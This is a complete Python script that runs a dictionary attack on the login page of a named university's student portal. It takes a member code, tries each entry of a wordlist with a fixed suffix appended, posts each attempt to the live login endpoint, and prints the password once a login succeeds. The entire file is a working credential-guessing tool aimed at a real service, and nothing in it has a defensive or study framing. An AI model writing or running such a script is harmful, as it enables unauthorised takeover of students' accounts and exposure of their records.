import sys
import requests
from bs4 import BeautifulSoup as bs

url='https://webkiosk.thapar.edu/CommonFiles/UserAction.jsp'

def connect(url,m_data):
	# print("requesting data:")
	resp=requests.post(url,data=m_data)
	# print("parsing data:")
	soup=bs(resp.text,'html.parser')
	x=soup.find_all('frame')
	# print("checking data:")
	if(len(x)!=0):
		print("\nPassword is "+m_data["Password"])
		sys.exit()
	resp = requests.post(url,data=m_data)

def controller():
	m={}
	dict_file=open('new_dict','r').read().split('\n')

	for i in range(3,len(sys.argv)):
			dict_file=[sys.argv[i]]+dict_file

	count=1
	print("beg: "+dict_file[0])
	print("last: "+dict_file[len(dict_file)-1])

	for line in dict_file:
		m["UserType"]="P"
		m["MemberCode"]=str(sys.argv[1])
		m["Password"]=str(line)+str(sys.argv[2])
		chk="Trying "+ str(line)+str(sys.argv[2])+", "+str(count)+" of "+str(len(dict_file))
		sys.stdout.write("\r\x1b[K"+chk)
		sys.stdout.flush()
		connect(url,m)
		count=count+1

controller()
	
